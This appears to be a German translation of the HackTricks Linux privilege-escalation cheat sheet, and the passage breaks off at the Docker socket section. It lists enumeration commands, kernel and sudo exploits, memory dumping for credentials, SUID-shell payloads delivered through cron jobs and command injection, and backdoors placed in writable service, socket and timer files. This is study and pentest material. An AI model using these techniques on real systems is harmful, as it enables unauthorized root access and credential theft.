# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Informationen

Beginnen wir damit, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du **Schreibrechte auf ein Verzeichnis innerhalb der `PATH`-Variable** hast, kannst du möglicherweise einige libraries oder binaries hijacken:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob ein Exploit existiert, der zur Privilegieneskalation genutzt werden kann
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, kannst du folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (auf dem victim ausführen, überprüft nur Exploits für Kernel 2.x)

Suche immer **die Kernel-Version in Google**, vielleicht ist deine Kernel-Version in einem Kernel-Exploit erwähnt und dann kannst du sicher sein, dass dieser Exploit gültig ist.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Basierend auf den anfälligen sudo-Versionen, die in den folgenden Einträgen erscheinen:
```bash
searchsploit sudo
```
Sie können prüfen, ob die sudo-Version verwundbar ist, indem Sie dieses grep verwenden.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) ermöglichen nicht-privilegierten lokalen Benutzern, ihre Rechte auf root zu erhöhen, indem sie die sudo `--chroot`-Option nutzen, wenn die Datei `/etc/nsswitch.conf` aus einem vom Benutzer kontrollierten Verzeichnis verwendet wird.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: Signaturprüfung fehlgeschlagen

Sieh dir die **smasher2 box of HTB** an für ein **Beispiel**, wie diese vuln ausgenutzt werden kann
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Verteidigungsmaßnahmen aufzählen

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:

{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfe **what is mounted and unmounted**, wo und warum. Falls etwas unmounted ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Auflisten nützlicher binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, falls du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf dem Rechner zu kompilieren, auf dem du ihn einsetzen willst (oder auf einem ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Verwundbare Software installiert

Überprüfe die **Version der installierten Pakete und Dienste**. Möglicherweise gibt es eine alte Nagios-Version (zum Beispiel), die ausgenutzt werden könnte, um escalating privileges…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um zu prüfen, ob veraltete oder verwundbare Software auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen, die größtenteils nutzlos sind; deshalb empfiehlt es sich, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine installierte Softwareversion für bekannte exploits verwundbar ist_

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden und überprüfe, ob ein Prozess **mehr Rechte hat, als er sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Prüfe immer, ob [**electron/cef/chromium debuggers** laufen — du könntest sie missbrauchen, um Privilegien zu eskalieren](electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es nach dem `--inspect`-Parameter in der Befehlszeile des Prozesses sucht.\
Außerdem **prüfe deine Berechtigungen für die Prozess-Binaries**, vielleicht kannst du eine überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Manche Services auf einem Server speichern **Zugangsdaten im Klartext im Speicher**.\
Normalerweise benötigt man **root privileges**, um den Speicher von Prozessen anderer Nutzer zu lesen; daher ist das in der Regel nützlicher, wenn du bereits root bist und weitere Zugangsdaten finden möchtest.\
Denke jedoch daran, dass **du als regulärer Nutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **ptrace nicht standardmäßig erlauben**, was bedeutet, dass du andere Prozesse, die anderen (unprivilegierten) Benutzern gehören, nicht dumpen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debugged werden, solange sie dieselbe uid haben. Das ist die klassische Art, wie ptrace funktionierte.
> - **kernel.yama.ptrace_scope = 1**: nur ein Parent-Prozess kann debugged werden.
> - **kernel.yama.ptrace_scope = 2**: nur Admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: keine Prozesse dürfen mit ptrace getraced werden. Sobald gesetzt, ist ein Reboot nötig, um ptracing wieder zu ermöglichen.

#### GDB

Wenn du Zugriff auf den Speicher eines Services (z. B. eines FTP-Servers) hast, könntest du den Heap auslesen und dort nach Zugangsdaten suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; außerdem zeigen sie die **Berechtigungen jeder abgebildeten Region**. Die **mem** Pseudo-Datei **macht den Speicher des Prozesses selbst zugänglich**. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und ihre Offsets. Wir verwenden diese Informationen, um **seek into the mem file and dump all readable regions** in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und **kmem**-Gruppe lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump ist eine für Linux neu interpretierte Version des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses zu dumpen, können Sie Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Sie können die root-Anforderungen manuell entfernen und den Prozess dumpen, der Ihnen gehört
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn Sie feststellen, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe die vorherigen Abschnitte, um verschiedene Möglichkeiten zu finden, den Speicher eines Prozesses zu dumpen) und im Speicher nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Arbeitsspeicher stehlen** und aus einigen **bekannten Dateien**. Es benötigt root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Wenn ein Web-"Crontab UI"-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es trotzdem über SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um privesc durchzuführen.

Typische Kette
- Finde einen nur auf loopback erreichbaren Port (z.B. 127.0.0.1:8000) und das Basic-Auth-Realm mittels `ss -ntlp` / `curl -v localhost:8000`
- Finde Anmeldedaten in Betriebsartefakten:
  - Backups/Skripte mit `zip -P <password>`
  - systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (legt eine SUID shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwende es:
```bash
/tmp/rootshell -p   # root shell
```
Absicherung
- Führe Crontab UI nicht als root aus; beschränke es auf einen dedizierten Benutzer mit minimalen Berechtigungen
- An localhost binden und zusätzlich den Zugriff via firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Vermeide das Einbetten von secrets in unit files; verwende secret stores oder eine nur für root zugängliche EnvironmentFile
- Aktiviere Audit/Logging für on-demand Job-Ausführungen

Überprüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ausnutzen, dass ein Skript als root ausgeführt wird (wildcard vuln? kannst du Dateien ändern, die root verwendet? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in dieser crontab der root-Benutzer versucht, einen Befehl oder ein Script auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root-Shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Wenn ein Script als root ausgeführt wird und ein “**\***” in einem Befehl enthalten ist, kannst du das ausnutzen, um unerwartete Dinge zu erreichen (wie privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn das wildcard einem Pfad wie** _**/some/path/***_* **vorausgeht, ist es nicht verwundbar (selbst** _**./***_ **nicht).**

Lese die folgende Seite für mehr wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und diese in einen arithmetic context einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root läuft.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird zuerst substituiert (das Kommando wird ausgeführt), dann wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Sorge dafür, dass vom Angreifer kontrollierter Text in das geparste Log geschrieben wird, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Kommando nichts auf stdout schreibt (oder leite die Ausgabe um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das vom root ausgeführte Script ein **Verzeichnis, auf das du vollen Zugriff hast**, verwendet, kann es nützlich sein, diesen Ordner zu löschen und **einen symlink-Ordner auf ein anderes Verzeichnis zu erstellen**, das ein von dir kontrolliertes Script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signierte cron-Binaries mit beschreibbaren Payloads
Blue teams signen manchmal cron-getriebene Binaries, indem sie eine benutzerdefinierte ELF-Section ausdumpen und nach einem Vendor-String mit grep suchen, bevor sie diese als root ausführen. Wenn dieses Binary group-writable ist (z. B. `/opt/AV/periodic-checks/monitor` im Besitz von `root:devs 770`) und du das signing-Material leakst, kannst du die Section fälschen und die cron-Task hijacken:

1. Verwende `pspy`, um den Verifizierungsablauf aufzuzeichnen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` und dann wurde die Datei ausgeführt.
2. Rekreiere das erwartete Zertifikat mit dem geleakten Key/Config (aus `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Erstelle einen bösartigen Ersatz (z. B. eine SUID bash ablegen, deinen SSH-Schlüssel hinzufügen) und bette das Zertifikat in `.text_sig` ein, sodass der grep erfolgreich ist:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und erhalte dabei die Ausführungsbits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron-Lauf; sobald die naive Signaturprüfung erfolgreich ist, läuft dein Payload als root.

### Häufige cron-Jobs

Du kannst Prozesse überwachen, um Prozesse zu finden, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und Privilegien eskalieren.

Zum Beispiel, um **alle 0.1s für 1 Minute zu überwachen**, **nach am wenigsten ausgeführten Befehlen zu sortieren** und die am häufigsten ausgeführten Befehle zu löschen, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies überwacht und listet jeden Prozess, der gestartet wird).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man **einen Carriage Return nach einem Kommentar** (ohne Newline-Zeichen) setzt, und der cron job funktioniert. Beispiel (beachte das Carriage-Return-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Beschreibbare _.service_ Dateien

Prüfe, ob du eine `.service` Datei schreiben kannst; wenn ja, **kannst du sie so ändern**, dass sie **deine backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **gestoppt** wird (möglicherweise musst du bis zum Neustart des Systems warten).\
Zum Beispiel erstelle deine backdoor in der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Service-Binaries

Beachte, dass wenn du **Schreibrechte für Binärdateien hast, die von Diensten ausgeführt werden**, du diese ändern kannst, um backdoors zu platzieren, sodass beim erneuten Ausführen der Dienste die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH sehen mit:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **Privilegien eskalieren**. Du musst nach **relativen Pfaden, die in Service-Konfigurationsdateien verwendet werden**, suchen, wie zum Beispiel:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann eine **executable** mit genau demselben Namen wie die relative Pfad-**binary** im systemd PATH-Ordner, in den du schreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (unprivilegierte Benutzer können normalerweise keine services starten/stoppen — prüfe aber, ob du `sudo -l` nutzen kannst).

**Mehr über services erfährst du mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd unit files, deren Name auf `**.timer**` endet und die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für calendar time events und monotonic time events bieten und asynchron ausgeführt werden können.

Du kannst alle **Timers** mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Writable timers

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige existierende systemd.unit auszuführen (wie eine `.service` oder eine `.target`).
```bash
Unit=backdoor.service
```
In der Dokumentation kannst du lesen, was die Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, verwendet dieser Wert standardmäßig einen service, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Name der aktivierten Unit und der Name der Timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müsstest du, um diese Berechtigung auszunutzen, folgendes tun:

- Finde eine systemd-Unit (wie eine `.service`), die eine **schreibbare Binärdatei ausführt**
- Finde eine systemd-Unit, die einen **relativen Pfad ausführt**, und über die du **Schreibrechte** auf den **systemd PATH** besitzt (um diese ausführbare Datei zu imitieren)

**Mehr über Timer erfährst du mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigst du root-Rechte und musst ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, der **timer** wird **aktiviert** durch das Erstellen eines Symlinks zu ihm auf `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) ermöglichen **Prozesskommunikation** auf derselben oder unterschiedlichen Maschinen innerhalb von Client-Server-Modellen. Sie nutzen Standard-Unix-Descriptor-Dateien für die Kommunikation zwischen Rechnern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen sind unterschiedlich, aber zusammengefasst dienen sie dazu, **anzugeben, wo auf den Socket gehört wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf die gehört werden soll, etc.)
- `Accept`: Erwartet ein boolean-Argument. Wenn **true**, wird für jede eingehende Verbindung eine **Service-Instanz gestartet** und nur der Verbindungssocket an diese übergeben. Wenn **false**, werden alle Listening-Sockets selbst **an die gestartete Service-Unit übergeben**, und es wird nur eine Service-Unit für alle Verbindungen gestartet. Dieser Wert wird bei Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos allen eingehenden Traffic verarbeitet. **Standardmäßig false**. Aus Performance-Gründen wird empfohlen, neue Daemons so zu implementieren, dass sie zu `Accept=no` passen.
- `ExecStartPre`, `ExecStartPost`: Nimmt eine oder mehrere Kommandozeilen, die **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Kommandozeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Kommandos**, die **ausgeführt werden bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Gibt den Namen der **service**-Unit an, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Standardmäßig ist dies die Service-Unit mit dem gleichen Namen wie der Socket (mit ersetztem Suffix). In den meisten Fällen sollte die Verwendung dieser Option nicht nötig sein.

### Writable .socket files

Wenn du eine **beschreibbare** `.socket`-Datei findest, kannst du am Anfang des `[Socket]`-Abschnitts etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die Backdoor wird ausgeführt, bevor der Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gebootet wird.**\  
_Beachte, dass das System genau diese Socket-Dateikonfiguration verwenden muss, sonst wird die Backdoor nicht ausgeführt_

### Writable sockets

Wenn du **einen beschreibbaren Socket identifizierst** (_hier geht es jetzt um Unix Sockets und nicht um die Konfigurations-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Verwundbarkeit ausnutzen.

### Auflisten von Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation-Beispiel:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es einige **sockets gibt, die HTTP-Anfragen entgegennehmen** (_ich meine nicht .socket-Dateien, sondern Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **auf eine HTTP-Anfrage antwortet**, können Sie mit ihm **kommunizieren** und vielleicht **exploit some vulnerability**.

### Schreibbarer Docker Socket

Der Docker-Socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist er schreibbar für den Benutzer `root` und Mitglieder der `docker`-Gruppe. Schreibzugriff auf diesen Socket kann zu privilege escalation führen. Hier ist eine Aufschlüsselung, wie das gemacht werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn Sie Schreibzugriff auf den Docker-Socket haben, können Sie mittels der folgenden Befehle escalate privileges:
```bash
